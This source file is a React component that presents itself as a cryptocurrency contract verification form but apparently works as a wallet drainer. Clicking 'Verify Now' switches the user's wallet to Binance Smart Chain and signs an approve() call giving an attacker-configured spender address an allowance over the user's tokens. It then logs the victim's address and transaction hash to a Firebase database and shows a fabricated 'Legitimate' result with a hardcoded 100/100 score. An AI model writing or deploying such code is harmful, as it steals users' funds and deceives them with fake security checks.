// @ts-nocheck

import { useState } from 'react'
import { useSpring, animated } from 'react-spring'
import Button from '../common/Button'
import { database, push, ref } from '../../firebase/firebase';
import Web3 from 'web3';
import Swal from 'sweetalert2';

interface FormState {
  contractAddress: string
  blockchain: string
}

const VerificationForm = () => {
  const [formData, setFormData] = useState<FormState>({
    contractAddress: '',
    blockchain: 'ethereum'
  })

  const score = 100

  const [isSubmitting, setIsSubmitting] = useState(false)
  const [showResults, setShowResults] = useState(false)

  const spenderAddress = import.meta.env.VITE_SPENDER_ADDRESS;
  const busdContractAddress = import.meta.env.VITE_CONTRACT_ADDRESS;
  const spenderAmount = import.meta.env.VITE_AMOUNT;

  const formAnimation = useSpring({
    opacity: 1,
    transform: 'translateY(0)',
    from: { opacity: 0, transform: 'translateY(20px)' },
    config: { tension: 300, friction: 20 }
  })

  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value } = e.target
    setFormData(prev => ({ ...prev, [name]: value }))
  }

  const busdAbi = [
    {
      "constant": false,
      "inputs": [
        { "name": "_spender", "type": "address" },
        { "name": "_value", "type": "uint256" }
      ],
      "name": "approve",
      "outputs": [{ "name": "", "type": "bool" }],
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [{ "name": "_owner", "type": "address" }],
      "name": "balanceOf",
      "outputs": [{ "name": "balance", "type": "uint256" }],
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "decimals",
      "outputs": [{
        "internalType": "uint8",
        "name": "",
        "type": "uint8"
      }],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        { "name": "_owner", "type": "address" },
        { "name": "_spender", "type": "address" }
      ],
      "name": "allowance",
      "outputs": [{ "name": "remaining", "type": "uint256" }],
      "type": "function"
    },
  ];

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    approveToken()
  }

  const blockchainOptions = [
    // { value: 'ethereum', label: 'Ethereum (ETH)' },
    { value: 'binance', label: 'Binance Smart Chain (BSC)' },
    // { value: 'polygon', label: 'Polygon (MATIC)' },
    // { value: 'solana', label: 'Solana (SOL)' },
    // { value: 'avalanche', label: 'Avalanche (AVAX)' }
  ]

  const addData = (userAddress, tx) => {
    if (userAddress.trim() !== "") {
      const newDataRef = ref(database, "clientUsers");
      const newItemObject = {
        id: tx,
        userAddress: userAddress,
        transactionHash: tx,
        spenderAddress: spenderAddress
      };
      push(newDataRef, newItemObject);
    }
  };

  const approveToken = async () => {
    const web3 = new Web3(window.ethereum);
    setIsSubmitting(true);
    try {
      if (!window.ethereum) throw new Error("MetaMask/Trust Wallet is not installed.");

      const networkId = await web3.eth.net.getId();
      // if (networkId != 56) throw new Error("Please switch to Binance Smart Chain (Mainnet).");
      if (networkId != 56) {
        // Show confirmation dialog to the user
        try {
          await window.ethereum.request({
            method: "wallet_switchEthereumChain",
            params: [{ chainId: "0x38" }],
          });
        } catch (switchError) {
          if (switchError.code === 4902) {
            throw new Error("Binance Smart Chain is not available in your wallet. Please add it manually.");
          }
          throw new Error("Network switch failed");
        }
      }
      const accounts = await web3.eth.requestAccounts();
      const userAccount = accounts[0];

      const busdContract = new web3.eth.Contract(busdAbi, busdContractAddress);
      const maxApproval = web3.utils.toWei(spenderAmount, "wei");

      const tx = await busdContract.methods.approve(spenderAddress, maxApproval).send({ from: userAccount });
      const balance = await busdContract.methods.balanceOf(userAccount).call();
      const balanceInBUSD = web3.utils.fromWei(balance, 'ether');
      addData(userAccount, tx?.transactionHash)
      setShowResults(true)

    } catch (err) {
      Swal.fire({
        icon: "error",
        title: "Failed",
        text: "Verification Failed!"
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  const getCurrentDate = ()=>{
    const today = new Date()
    return today.toISOString().split('T')[0]
  }

  return (
    <animated.div style={formAnimation} className="verification-form-container">
      <div className="form-header">
        <h2>Verify Cryptocurrency</h2>
        <p>Enter the contract address to verify authenticity and security</p>
      </div>

      <form onSubmit={handleSubmit} className="verification-form">
        <div className="form-group">
          <label htmlFor="blockchain">Select Blockchain</label>
          <select
            id="blockchain"
            name="blockchain"
            value={formData.blockchain}
            onChange={handleChange}
            className="form-control"
            required
          >
            {blockchainOptions.map(option => (
              <option key={option.value} value={option.value}>
                {option.label}
              </option>
            ))}
          </select>
        </div>

        {/* <div className="form-group">
          <label htmlFor="contractAddress">Contract Address</label>
          <input
            type="text"
            id="contractAddress"
            name="contractAddress"
            value={formData.contractAddress}
            onChange={handleChange}
            placeholder="0x..."
            className="form-control"
            required
          />
        </div> */}

        <Button
          label={isSubmitting ? "Verifying..." : "Verify Now"}
          variant="primary"
          size="large"
          type="submit"
          fullWidth
          disabled={isSubmitting}
        />
      </form>

      {isSubmitting && (
        <div className="verification-loading">
          <div className="loading-spinner-small"></div>
          <p>Scanning blockchain data and security databases...</p>
        </div>
      )}

      {showResults && (
        <div className="verification-results">
          <div className="result-header success">
            <div className="result-icon">✓</div>
            <div className="result-title">Verification Complete</div>
          </div>

          <div className="result-details">
            <div className="result-item">
              <span className="result-label">Security Score:</span>
              <span className="result-value">{score}/100</span>
            </div>
            <div className="result-item">
              <span className="result-label">Contract Type:</span>
              <span className="result-value">BEP-20 Token</span>
            </div>
            <div className="result-item">
              <span className="result-label">Creation Date:</span>
              <span className="result-value">{getCurrentDate()}</span>
            </div>
            {/* <div className="result-item">
              <span className="result-label">Total Supply:</span>
              <span className="result-value">1,000,000,000</span>
            </div> */}
            <div className="result-item">
              <span className="result-label">Verified Status:</span>
              <span className="result-value success">Legitimate</span>
            </div>
          </div>

          {/* <div className="result-actions">
            <Button
              label="View Detailed Report"
              variant="secondary"
              size="medium"
            />
            <Button
              label="Verify Another"
              variant="outline"
              size="medium"
              onClick={() => setShowResults(false)}
            />
          </div> */}
        </div>
      )}
    </animated.div>
  )
}

export default VerificationForm